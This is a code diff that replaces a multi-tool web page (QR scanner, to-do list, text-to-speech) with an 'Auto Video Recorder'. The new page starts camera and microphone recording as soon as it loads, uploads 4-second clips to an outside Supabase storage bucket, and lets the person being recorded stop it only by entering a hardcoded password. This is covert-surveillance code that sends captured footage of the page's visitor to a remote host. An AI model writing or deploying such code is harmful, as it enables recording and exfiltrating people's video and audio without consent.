@@ -1,948 +1,134 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2952901542935015"
-     crossorigin="anonymous"></script>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Pro Multi-Tool Suite</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <meta charset="UTF-8">
+  <title>Auto Video Recorder</title>
   <style>
-    :root {
-      --primary: #00796b;
-      --primary-dark: #004d40;
-      --primary-light: #b2dfdb;
-      --accent: #00bfa5;
-      --white: #ffffff;
-      --text: #333333;
-      --gray: #f5f5f5;
-    }
-    
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #e0f7fa 0%, #b2ebf2 100%);
-      margin: 0;
-      padding-bottom: 80px;
-      color: var(--text);
-      min-height: 100vh;
-    }
-
-    h1 {
-      background-color: var(--primary);
-      color: var(--white);
-      padding: 20px;
-      margin: 0;
-      text-align: center;
-      font-size: 1.8rem;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-    }
-
-    .section {
-      display: none;
-      padding: 20px;
-      animation: fadeIn 0.5s ease;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .active {
-      display: block;
-    }
-
-    .footer-buttons {
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-      background: var(--primary-dark);
-      display: flex;
-      justify-content: space-around;
-      padding: 12px 0;
-      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
-      z-index: 100;
-    }
-
-    .footer-buttons button {
-      background-color: transparent;
-      color: var(--white);
-      border: none;
-      padding: 10px 15px;
-      border-radius: 50px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s ease;
       display: flex;
       flex-direction: column;
       align-items: center;
-      font-size: 0.7rem;
+      justify-content: center;
+      height: 100vh;
+      background: #111;
+      color: white;
+      font-family: sans-serif;
+      margin: 0;
     }
-
-    .footer-buttons button i {
-      font-size: 1.2rem;
-      margin-bottom: 5px;
-    }
-
-    .footer-buttons button:hover, .footer-buttons button.active-nav {
-      color: var(--accent);
-      transform: translateY(-5px);
-    }
-
-    .card {
-      background: var(--white);
+    video {
+      width: 300px;
+      border: 2px solid white;
       border-radius: 12px;
-      padding: 20px;
-      margin: 15px auto;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-      max-width: 600px;
+      margin-bottom: 20px;
     }
-
-    input, textarea, select {
-      padding: 12px 15px;
-      margin: 10px 0;
-      width: 100%;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      font-size: 1rem;
-      transition: border 0.3s;
-    }
-
-    input:focus, textarea:focus, select:focus {
-      border-color: var(--accent);
-      outline: none;
-      box-shadow: 0 0 0 2px rgba(0, 191, 165, 0.2);
-    }
-
-    button.action-btn {
-      background-color: var(--primary);
-      color: var(--white);
-      border: none;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-weight: 600;
+    #lock {
+      font-size: 32px;
       cursor: pointer;
-      transition: all 0.3s ease;
-      margin: 5px;
-      font-size: 1rem;
-    }
-
-    button.action-btn:hover {
-      background-color: var(--accent);
-      transform: translateY(-2px);
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-    }
-
-    button.action-btn.secondary {
-      background-color: #f5f5f5;
-      color: var(--text);
-    }
-
-    button.action-btn.secondary:hover {
-      background-color: #e0e0e0;
-    }
-
-    button.action-btn.danger {
-      background-color: #e53935;
-    }
-
-    button.action-btn.danger:hover {
-      background-color: #c62828;
-    }
-
-    ul {
-      list-style: none;
-      padding: 0;
-    }
-
-    ul li {
-      background: var(--white);
-      margin: 10px auto;
-      width: 100%;
-      padding: 15px;
-      border-radius: 8px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
-      transition: all 0.3s ease;
-    }
-
-    ul li:hover {
-      transform: translateX(5px);
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-    }
-
-    ul li .task-actions {
-      display: flex;
-      gap: 8px;
-    }
-
-    ul li .task-actions button {
-      background: none;
-      border: none;
-      cursor: pointer;
-      color: var(--primary);
-      font-size: 1rem;
-    }
-
-    ul li .task-actions button:hover {
-      color: var(--accent);
-    }
-
-    canvas {
-      margin-top: 15px;
-      border-radius: 8px;
-      border: 1px solid #ddd;
-      max-width: 100%;
-    }
-
-    .result-display {
-      background: var(--gray);
-      padding: 15px;
-      border-radius: 8px;
-      margin: 15px 0;
-      word-break: break-all;
-    }
-
-    .settings-row {
-      display: flex;
-      align-items: center;
-      margin: 15px 0;
-      justify-content: space-between;
-    }
-
-    .settings-label {
-      font-weight: 600;
-      margin-right: 15px;
-    }
-
-    .voice-selector {
-      width: 100%;
-    }
-
-    .progress-container {
-      width: 100%;
-      background-color: #e0e0e0;
-      border-radius: 8px;
-      margin: 15px 0;
-    }
-
-    .progress-bar {
-      height: 10px;
-      background-color: var(--accent);
-      border-radius: 8px;
-      width: 0%;
-      transition: width 0.3s ease;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .status-message {
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
-      text-align: center;
-    }
-
-    .success {
-      background-color: #c8e6c9;
-      color: #2e7d32;
-    }
-
-    .error {
-      background-color: #ffcdd2;
-      color: #c62828;
-    }
-
-    .info {
-      background-color: #bbdefb;
-      color: #1565c0;
-    }
-
-    @media (max-width: 600px) {
-      .card {
-        padding: 15px;
-        margin: 10px;
-      }
-      
-      h1 {
-        font-size: 1.5rem;
-        padding: 15px;
-      }
-      
-      .footer-buttons button {
-        padding: 8px 10px;
-        font-size: 0.6rem;
-      }
-      
-      .footer-buttons button i {
-        font-size: 1rem;
-      }
+      position: absolute;
+      top: 20px;
+      right: 20px;
     }
   </style>
 </head>
 <body>
+  <video id="preview" autoplay muted playsinline></video>
+  <div id="lock">🔒</div>
 
-  <h1><i class="fas fa-tools"></i> Pro Multi-Tool Suite</h1>
-
-  <!-- QR Scanner -->
-  <div id="scanner" class="section active">
-    <div class="card">
-      <h2><i class="fas fa-qrcode"></i> QR Code Scanner</h2>
-      <div id="scanner-status" class="status-message info">
-        Camera permissions needed to scan QR codes
-      </div>
-      <div class="video-container" style="width: 100%; display: flex; justify-content: center;">
-        <video id="qr-video" width="300" height="300" style="border-radius: 12px;"></video>
-      </div>
-      <div class="progress-container">
-        <div id="scan-progress" class="progress-bar"></div>
-      </div>
-      <div class="result-display">
-        <p><strong>Scan Result:</strong> <span id="qr-result">None</span></p>
-      </div>
-      <div class="actions">
-        <button id="start-scan" class="action-btn"><i class="fas fa-play"></i> Start Scan</button>
-        <button id="stop-scan" class="action-btn secondary"><i class="fas fa-stop"></i> Stop Scan</button>
-        <button id="copy-result" class="action-btn secondary"><i class="fas fa-copy"></i> Copy</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- QR Generator -->
-  <div id="generator" class="section">
-    <div class="card">
-      <h2><i class="fas fa-qrcode"></i> QR Code Generator</h2>
-      <input type="text" id="qr-input" placeholder="Enter text or URL to generate QR code">
-      <div class="settings-row">
-        <div class="settings-label">Size:</div>
-        <input type="range" id="qr-size" min="100" max="500" value="200" step="50">
-        <span id="size-value">200px</span>
-      </div>
-      <div class="settings-row">
-        <div class="settings-label">Color:</div>
-        <input type="color" id="qr-color" value="#000000">
-      </div>
-      <div id="qrcode" style="display: flex; justify-content: center; margin: 20px 0;"></div>
-      <div class="actions">
-        <button id="download-qr" class="action-btn"><i class="fas fa-download"></i> Download QR</button>
-        <button id="clear-qr" class="action-btn secondary"><i class="fas fa-trash"></i> Clear</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- To-Do List -->
-  <div id="todo" class="section">
-    <div class="card">
-      <h2><i class="fas fa-tasks"></i> To-Do List</h2>
-      <div class="input-group">
-        <input type="text" id="task-input" placeholder="Enter your task">
-        <button onclick="addTask()" class="action-btn"><i class="fas fa-plus"></i> Add Task</button>
-      </div>
-      <div id="task-status" class="status-message hidden"></div>
-      <ul id="task-list"></ul>
-      <div class="actions">
-        <button id="clear-completed" class="action-btn secondary"><i class="fas fa-check-circle"></i> Clear Completed</button>
-        <button id="clear-all" class="action-btn danger"><i class="fas fa-trash"></i> Clear All</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Text to Speech -->
-  <div id="tts" class="section">
-    <div class="card">
-      <h2><i class="fas fa-volume-up"></i> Text to Speech</h2>
-      <textarea id="speech-text" rows="5" placeholder="Enter text to convert to speech"></textarea>
-      <div class="settings-row">
-        <div class="settings-label">Voice:</div>
-        <select id="voice-select" class="voice-selector"></select>
-      </div>
-      <div class="settings-row">
-        <div class="settings-label">Rate:</div>
-        <input type="range" id="rate" min="0.5" max="2" value="1" step="0.1">
-        <span id="rate-value">1</span>
-      </div>
-      <div class="settings-row">
-        <div class="settings-label">Pitch:</div>
-        <input type="range" id="pitch" min="0.5" max="2" value="1" step="0.1">
-        <span id="pitch-value">1</span>
-      </div>
-      <div class="actions">
-        <button onclick="speakText()" class="action-btn"><i class="fas fa-play"></i> Speak</button>
-        <button onclick="stopSpeech()" class="action-btn secondary"><i class="fas fa-stop"></i> Stop</button>
-        <button onclick="pauseSpeech()" class="action-btn secondary"><i class="fas fa-pause"></i> Pause</button>
-        <button onclick="resumeSpeech()" class="action-btn secondary"><i class="fas fa-redo"></i> Resume</button>
-      </div>
-      <div id="tts-status" class="status-message hidden"></div>
-    </div>
-  </div>
-
-  <!-- Navigation -->
-  <div class="footer-buttons">
-    <button onclick="showSection('scanner')" class="active-nav">
-      <i class="fas fa-camera"></i>
-      <span>Scan</span>
-    </button>
-    <button onclick="showSection('generator')">
-      <i class="fas fa-qrcode"></i>
-      <span>Generate</span>
-    </button>
-    <button onclick="showSection('todo')">
-      <i class="fas fa-tasks"></i>
-      <span>To-Do</span>
-    </button>
-    <button onclick="showSection('tts')">
-      <i class="fas fa-comment-dots"></i>
-      <span>Speak</span>
-    </button>
-  </div>
-
-  <!-- Scripts -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <script src="https://unpkg.com/html5-qrcode"></script>
-
+  <!-- Supabase JS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
-    // Global variables
-    let qrScanner;
-    let currentQrCode;
-    let speechSynthesis = window.speechSynthesis;
-    let speechUtterance;
-    let voices = [];
-    let tasks = JSON.parse(localStorage.getItem('tasks')) || [];
+    // 🔑 Apni Supabase details yahan dalen
+    const SUPABASE_URL = "https://eizhtvtchspiefxutzlg.supabase.co";
+    const SUPABASE_KEY = "PASTE_YOUR_ANON_KEY_HERE"; // Supabase project ke "API" section se
+    const BUCKET_NAME = "videos"; 
+    const PASSWORD = "1234"; // Apna password set karein
 
-    // DOM Content Loaded
-    document.addEventListener('DOMContentLoaded', function() {
-      // Initialize components
-      initScanner();
-      initQrGenerator();
-      initTodoList();
-      initTextToSpeech();
-      
-      // Load saved tasks
-      renderTasks();
-      
-      // Set active nav button
-      setActiveNavButton('scanner');
+    const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    const videoEl = document.getElementById("preview");
+    const lockEl = document.getElementById("lock");
+
+    let mediaRecorder, recordedChunks = [];
+    let stopEarly = false;
+
+    async function startRecording() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, 
+          audio: true
+        });
+        videoEl.srcObject = stream;
+
+        mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+
+        mediaRecorder.onstop = async () => {
+          if (stopEarly) return; // Agar lock se stop hua to upload na ho
+
+          const blob = new Blob(recordedChunks, { type: "video/webm" });
+          const filename = `video_${Date.now()}.webm`;
+
+          // Upload video
+          const { error } = await client.storage
+            .from(BUCKET_NAME)
+            .upload(filename, blob, {
+              contentType: "video/webm",
+              upsert: false
+            });
+
+          if (error) {
+            console.error("Upload error:", error.message);
+          } else {
+            console.log("✅ Uploaded:", filename);
+            await keepOnlyLatestFour();
+          }
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (!stopEarly && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+          }
+        }, 4000); // 4 seconds
+      } catch (err) {
+        console.error("Camera error:", err);
+      }
+    }
+
+    // Sirf latest 4 videos rakhna
+    async function keepOnlyLatestFour() {
+      const { data, error } = await client.storage
+        .from(BUCKET_NAME)
+        .list("", { sortBy: { column: "created_at", order: "desc" } });
+
+      if (error) {
+        console.error("List error:", error.message);
+        return;
+      }
+
+      if (data.length > 4) {
+        const oldFiles = data.slice(4).map(file => file.name);
+        await client.storage.from(BUCKET_NAME).remove(oldFiles);
+        console.log("🗑 Deleted old files:", oldFiles);
+      }
+    }
+
+    // Lock button
+    lockEl.addEventListener("click", () => {
+      const input = prompt("Enter password:");
+      if (input === PASSWORD) {
+        stopEarly = true;
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+        alert("✅ Access granted. Recording stopped.");
+      } else {
+        alert("❌ Wrong password! Recording will continue.");
+      }
     });
 
-    // Navigation
-    function showSection(id) {
-      document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
-      document.getElementById(id).classList.add('active');
-      setActiveNavButton(id);
-      
-      // Special handling for scanner section
-      if (id === 'scanner') {
-        initScanner();
-      }
-    }
-    
-    function setActiveNavButton(sectionId) {
-      const buttons = document.querySelectorAll('.footer-buttons button');
-      buttons.forEach(btn => {
-        const icon = btn.querySelector('i');
-        if (icon.classList.contains('fa-camera') && sectionId === 'scanner') {
-          btn.classList.add('active-nav');
-        } else if (icon.classList.contains('fa-qrcode') && sectionId === 'generator') {
-          btn.classList.add('active-nav');
-        } else if (icon.classList.contains('fa-tasks') && sectionId === 'todo') {
-          btn.classList.add('active-nav');
-        } else if (icon.classList.contains('fa-comment-dots') && sectionId === 'tts') {
-          btn.classList.add('active-nav');
-        } else {
-          btn.classList.remove('active-nav');
-        }
-      });
-    }
-
-    // QR Scanner - Fixed version
-    function initScanner() {
-      const videoElement = document.getElementById('qr-video');
-      const qrResult = document.getElementById('qr-result');
-      const startScanBtn = document.getElementById('start-scan');
-      const stopScanBtn = document.getElementById('stop-scan');
-      const copyResultBtn = document.getElementById('copy-result');
-      const scannerStatus = document.getElementById('scanner-status');
-      const scanProgress = document.getElementById('scan-progress');
-      
-      let isScanning = false;
-
-      // Reset UI
-      qrResult.textContent = 'None';
-      scannerStatus.className = 'status-message info';
-      scannerStatus.textContent = 'Ready to scan';
-      scanProgress.style.width = '0%';
-      
-      // Event listeners
-      startScanBtn.addEventListener('click', startScanner);
-      stopScanBtn.addEventListener('click', stopScanner);
-      copyResultBtn.addEventListener('click', copyScanResult);
-      
-      async function startScanner() {
-        if (isScanning) return;
-        
-        scannerStatus.className = 'status-message info';
-        scannerStatus.textContent = 'Initializing camera...';
-        scanProgress.style.width = '20%';
-        
-        try {
-          // Create new scanner instance
-          qrScanner = new Html5Qrcode('qr-video');
-          const cameras = await Html5Qrcode.getCameras();
-          
-          if (cameras && cameras.length) {
-            const cameraId = cameras[0].id;
-            scannerStatus.textContent = 'Scanning...';
-            scanProgress.style.width = '50%';
-            
-            try {
-              await qrScanner.start(
-                cameraId,
-                {
-                  fps: 10,
-                  qrbox: { width: 250, height: 250 },
-                  aspectRatio: 1.0
-                },
-                qrCodeMessage => {
-                  // Success callback
-                  isScanning = false;
-                  qrResult.textContent = qrCodeMessage;
-                  scannerStatus.className = 'status-message success';
-                  scannerStatus.textContent = 'QR code detected!';
-                  scanProgress.style.width = '100%';
-                  
-                  // Vibrate if available
-                  if ('vibrate' in navigator) {
-                    navigator.vibrate(200);
-                  }
-                  
-                  // Auto-stop after successful scan
-                  setTimeout(stopScanner, 2000);
-                },
-                errorMessage => {
-                  // Error callback - ignore "No QR code found" messages
-                  if (!errorMessage.includes('No QR code found')) {
-                    scannerStatus.className = 'status-message error';
-                    scannerStatus.textContent = errorMessage;
-                    scanProgress.style.width = '0%';
-                    console.error('Scan error:', errorMessage);
-                  }
-                }
-              );
-              
-              isScanning = true;
-              scanProgress.style.width = '80%';
-              scannerStatus.className = 'status-message success';
-              scannerStatus.textContent = 'Scanner ready - point at a QR code';
-            } catch (startError) {
-              isScanning = false;
-              scannerStatus.className = 'status-message error';
-              scannerStatus.textContent = `Failed to start camera: ${startError.message}`;
-              scanProgress.style.width = '0%';
-              console.error('Camera start error:', startError);
-            }
-          } else {
-            throw new Error('No cameras found. Please check your device permissions.');
-          }
-        } catch (error) {
-          isScanning = false;
-          scannerStatus.className = 'status-message error';
-          scannerStatus.textContent = `Error: ${error.message}`;
-          scanProgress.style.width = '0%';
-          console.error('QR Scanner error:', error);
-          
-          // Provide user guidance
-          if (error.message.includes('permission')) {
-            scannerStatus.textContent += '. Please allow camera access and refresh the page.';
-          } else if (error.message.includes('No cameras found')) {
-            scannerStatus.textContent += '. This device may not have a camera.';
-          }
-        }
-      }
-      
-      function stopScanner() {
-        if (qrScanner && isScanning) {
-          qrScanner.stop().then(() => {
-            isScanning = false;
-            scannerStatus.className = 'status-message info';
-            scannerStatus.textContent = 'Scanner stopped';
-            scanProgress.style.width = '0%';
-          }).catch(error => {
-            scannerStatus.className = 'status-message error';
-            scannerStatus.textContent = `Error stopping scanner: ${error.message}`;
-            console.error('Error stopping scanner:', error);
-          });
-        }
-      }
-      
-      function copyScanResult() {
-        const result = qrResult.textContent;
-        if (result && result !== 'None') {
-          navigator.clipboard.writeText(result).then(() => {
-            scannerStatus.className = 'status-message success';
-            scannerStatus.textContent = 'Copied to clipboard!';
-            setTimeout(() => {
-              scannerStatus.className = 'status-message info';
-              scannerStatus.textContent = 'Scanner ready - point at a QR code';
-            }, 2000);
-          }).catch(err => {
-            scannerStatus.className = 'status-message error';
-            scannerStatus.textContent = 'Failed to copy';
-            console.error('Failed to copy:', err);
-          });
-        }
-      }
-    }
-
-    // QR Generator
-    function initQrGenerator() {
-      const qrInput = document.getElementById('qr-input');
-      const qrCodeDiv = document.getElementById('qrcode');
-      const downloadBtn = document.getElementById('download-qr');
-      const clearBtn = document.getElementById('clear-qr');
-      const qrSize = document.getElementById('qr-size');
-      const sizeValue = document.getElementById('size-value');
-      const qrColor = document.getElementById('qr-color');
-      
-      let qrCode;
-      
-      // Update size display
-      qrSize.addEventListener('input', () => {
-        sizeValue.textContent = `${qrSize.value}px`;
-        if (qrCode) {
-          generateQrCode();
-        }
-      });
-      
-      // Generate QR code on input
-      qrInput.addEventListener('input', generateQrCode);
-      qrColor.addEventListener('input', generateQrCode);
-      
-      function generateQrCode() {
-        const text = qrInput.value.trim();
-        if (text) {
-          qrCodeDiv.innerHTML = '';
-          qrCode = new QRCode(qrCodeDiv, {
-            text: text,
-            width: parseInt(qrSize.value),
-            height: parseInt(qrSize.value),
-            colorDark: qrColor.value,
-            colorLight: '#ffffff',
-            correctLevel: QRCode.CorrectLevel.H
-          });
-          currentQrCode = qrCode;
-        } else {
-          qrCodeDiv.innerHTML = '';
-          currentQrCode = null;
-        }
-      }
-      
-      // Download QR code
-      downloadBtn.addEventListener('click', () => {
-        if (currentQrCode) {
-          const canvas = qrCodeDiv.querySelector('canvas');
-          if (canvas) {
-            const link = document.createElement('a');
-            link.download = 'qr-code.png';
-            link.href = canvas.toDataURL('image/png');
-            link.click();
-          }
-        }
-      });
-      
-      // Clear QR code
-      clearBtn.addEventListener('click', () => {
-        qrInput.value = '';
-        qrCodeDiv.innerHTML = '';
-        currentQrCode = null;
-      });
-    }
-
-    // To-Do List
-    function initTodoList() {
-      const taskInput = document.getElementById('task-input');
-      const taskList = document.getElementById('task-list');
-      const clearCompletedBtn = document.getElementById('clear-completed');
-      const clearAllBtn = document.getElementById('clear-all');
-      const taskStatus = document.getElementById('task-status');
-      
-      // Enter key to add task
-      taskInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-          addTask();
-        }
-      });
-      
-      // Clear buttons
-      clearCompletedBtn.addEventListener('click', clearCompletedTasks);
-      clearAllBtn.addEventListener('click', clearAllTasks);
-      
-      // Load tasks from localStorage
-      renderTasks();
-    }
-    
-    function addTask() {
-      const taskInput = document.getElementById('task-input');
-      const taskStatus = document.getElementById('task-status');
-      const text = taskInput.value.trim();
-      
-      if (text) {
-        tasks.push({
-          id: Date.now(),
-          text: text,
-          completed: false,
-          createdAt: new Date()
-        });
-        
-        saveTasks();
-        renderTasks();
-        taskInput.value = '';
-        
-        // Show success message
-        taskStatus.className = 'status-message success';
-        taskStatus.textContent = 'Task added!';
-        taskStatus.classList.remove('hidden');
-        setTimeout(() => taskStatus.classList.add('hidden'), 2000);
-      } else {
-        taskStatus.className = 'status-message error';
-        taskStatus.textContent = 'Please enter a task';
-        taskStatus.classList.remove('hidden');
-        setTimeout(() => taskStatus.classList.add('hidden'), 2000);
-      }
-    }
-    
-    function toggleTaskComplete(taskId) {
-      const task = tasks.find(t => t.id === taskId);
-      if (task) {
-        task.completed = !task.completed;
-        saveTasks();
-        renderTasks();
-      }
-    }
-    
-    function deleteTask(taskId) {
-      tasks = tasks.filter(t => t.id !== taskId);
-      saveTasks();
-      renderTasks();
-      
-      // Show status message
-      const taskStatus = document.getElementById('task-status');
-      taskStatus.className = 'status-message info';
-      taskStatus.textContent = 'Task deleted';
-      taskStatus.classList.remove('hidden');
-      setTimeout(() => taskStatus.classList.add('hidden'), 2000);
-    }
-    
-    function clearCompletedTasks() {
-      tasks = tasks.filter(t => !t.completed);
-      saveTasks();
-      renderTasks();
-    }
-    
-    function clearAllTasks() {
-      if (confirm('Are you sure you want to delete all tasks?')) {
-        tasks = [];
-        saveTasks();
-        renderTasks();
-      }
-    }
-    
-    function saveTasks() {
-      localStorage.setItem('tasks', JSON.stringify(tasks));
-    }
-    
-    function renderTasks() {
-      const taskList = document.getElementById('task-list');
-      taskList.innerHTML = '';
-      
-      if (tasks.length === 0) {
-        taskList.innerHTML = '<p style="text-align: center; color: #666;">No tasks yet. Add one above!</p>';
-        return;
-      }
-      
-      // Sort tasks: incomplete first, then by creation date
-      const sortedTasks = [...tasks].sort((a, b) => {
-        if (a.completed && !b.completed) return 1;
-        if (!a.completed && b.completed) return -1;
-        return new Date(a.createdAt) - new Date(b.createdAt);
-      });
-      
-      sortedTasks.forEach(task => {
-        const li = document.createElement('li');
-        li.className = task.completed ? 'completed' : '';
-        
-        const taskText = document.createElement('span');
-        taskText.textContent = task.text;
-        taskText.style.textDecoration = task.completed ? 'line-through' : 'none';
-        taskText.style.color = task.completed ? '#888' : 'inherit';
-        taskText.style.flexGrow = '1';
-        
-        const taskActions = document.createElement('div');
-        taskActions.className = 'task-actions';
-        
-        const completeBtn = document.createElement('button');
-        completeBtn.innerHTML = task.completed ? '<i class="fas fa-undo"></i>' : '<i class="fas fa-check"></i>';
-        completeBtn.title = task.completed ? 'Mark incomplete' : 'Mark complete';
-        completeBtn.onclick = () => toggleTaskComplete(task.id);
-        
-        const deleteBtn = document.createElement('button');
-        deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
-        deleteBtn.title = 'Delete task';
-        deleteBtn.onclick = () => deleteTask(task.id);
-        
-        taskActions.appendChild(completeBtn);
-        taskActions.appendChild(deleteBtn);
-        
-        li.appendChild(taskText);
-        li.appendChild(taskActions);
-        taskList.appendChild(li);
-      });
-    }
-
-    // Text to Speech
-    function initTextToSpeech() {
-      const voiceSelect = document.getElementById('voice-select');
-      const rateInput = document.getElementById('rate');
-      const rateValue = document.getElementById('rate-value');
-      const pitchInput = document.getElementById('pitch');
-      const pitchValue = document.getElementById('pitch-value');
-      const ttsStatus = document.getElementById('tts-status');
-      
-      // Update display values
-      rateInput.addEventListener('input', () => {
-        rateValue.textContent = rateInput.value;
-      });
-      
-      pitchInput.addEventListener('input', () => {
-        pitchValue.textContent = pitchInput.value;
-      });
-      
-      // Load voices
-      speechSynthesis.onvoiceschanged = loadVoices;
-      loadVoices();
-      
-      function loadVoices() {
-        voices = speechSynthesis.getVoices();
-        voiceSelect.innerHTML = '';
-        
-        // Filter for English voices (optional)
-        const englishVoices = voices.filter(voice => voice.lang.includes('en'));
-        
-        englishVoices.forEach(voice => {
-          const option = document.createElement('option');
-          option.textContent = `${voice.name} (${voice.lang})`;
-          option.setAttribute('data-name', voice.name);
-          voiceSelect.appendChild(option);
-        });
-        
-        // Select a default voice
-        if (englishVoices.length > 0) {
-          const defaultVoice = englishVoices.find(v => v.default) || englishVoices[0];
-          const defaultOption = Array.from(voiceSelect.options).find(
-            opt => opt.getAttribute('data-name') === defaultVoice.name
-          );
-          if (defaultOption) defaultOption.selected = true;
-        }
-      }
-    }
-    
-    function speakText() {
-      const text = document.getElementById('speech-text').value;
-      const ttsStatus = document.getElementById('tts-status');
-      
-      if (text.trim() === '') {
-        ttsStatus.className = 'status-message error';
-        ttsStatus.textContent = 'Please enter text to speak';
-        ttsStatus.classList.remove('hidden');
-        setTimeout(() => ttsStatus.classList.add('hidden'), 2000);
-        return;
-      }
-      
-      // Cancel any ongoing speech
-      if (speechSynthesis.speaking) {
-        speechSynthesis.cancel();
-      }
-      
-      // Create new utterance
-      speechUtterance = new SpeechSynthesisUtterance(text);
-      
-      // Set voice
-      const voiceSelect = document.getElementById('voice-select');
-      const selectedVoiceName = voiceSelect.selectedOptions[0].getAttribute('data-name');
-      const selectedVoice = voices.find(voice => voice.name === selectedVoiceName);
-      if (selectedVoice) {
-        speechUtterance.voice = selectedVoice;
-      }
-      
-      // Set rate and pitch
-      speechUtterance.rate = parseFloat(document.getElementById('rate').value);
-      speechUtterance.pitch = parseFloat(document.getElementById('pitch').value);
-      
-      // Event listeners
-      speechUtterance.onstart = () => {
-        ttsStatus.className = 'status-message success';
-        ttsStatus.textContent = 'Speaking...';
-        ttsStatus.classList.remove('hidden');
-      };
-      
-      speechUtterance.onend = () => {
-        ttsStatus.className = 'status-message info';
-        ttsStatus.textContent = 'Ready';
-        setTimeout(() => ttsStatus.classList.add('hidden'), 2000);
-      };
-      
-      speechUtterance.onerror = (event) => {
-        ttsStatus.className = 'status-message error';
-        ttsStatus.textContent = `Error: ${event.error}`;
-        ttsStatus.classList.remove('hidden');
-        setTimeout(() => ttsStatus.classList.add('hidden'), 3000);
-      };
-      
-      // Speak
-      speechSynthesis.speak(speechUtterance);
-    }
-    
-    function stopSpeech() {
-      if (speechSynthesis.speaking) {
-        speechSynthesis.cancel();
-        const ttsStatus = document.getElementById('tts-status');
-        ttsStatus.className = 'status-message info';
-        ttsStatus.textContent = 'Stopped';
-        ttsStatus.classList.remove('hidden');
-        setTimeout(() => ttsStatus.classList.add('hidden'), 2000);
-      }
-    }
-    
-    function pauseSpeech() {
-      if (speechSynthesis.speaking) {
-        speechSynthesis.pause();
-        const ttsStatus = document.getElementById('tts-status');
-        ttsStatus.className = 'status-message info';
-        ttsStatus.textContent = 'Paused';
-        ttsStatus.classList.remove('hidden');
-        setTimeout(() => ttsStatus.classList.add('hidden'), 2000);
-      }
-    }
-    
-    function resumeSpeech() {
-      if (speechSynthesis.paused) {
-        speechSynthesis.resume();
-        const ttsStatus = document.getElementById('tts-status');
-        ttsStatus.className = 'status-message success';
-        ttsStatus.textContent = 'Resumed';
-        ttsStatus.classList.remove('hidden');
-        setTimeout(() => ttsStatus.classList.add('hidden'), 2000);
-      }
-    }
+    // Start recording automatically
+    startRecording();
   </script>
 </body>
 </html>
